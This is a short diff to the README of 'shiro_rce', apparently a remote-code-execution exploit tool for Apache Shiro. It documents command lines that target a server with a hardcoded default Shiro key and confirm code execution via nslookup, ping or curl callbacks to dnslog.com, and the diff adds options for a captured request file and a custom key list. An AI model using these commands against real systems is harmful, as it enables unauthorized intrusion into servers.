@@ -1,10 +1,12 @@
 # shiro_rce
 
 ```
-java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA==
+java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA== req=1.txt keys=key.txt
 nslookup/ping1/ping2/curl--> use nslookup dnslog.com check./use ping -c 1 dnslog.com check(default)./use ping -n 1 dnslog.com check./use curl dnslog.com check.
 nocheck --> skip check target is shiro or not.
 key= --> set a shiro key.
+req= --> request body file 抓包保存到文件里，这里写文件名
+keys= --> keys file  自定义key的文件，key按行分割，即每行写一个
 
 [admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
 [-] target: https://xx.xx.xx.xx/
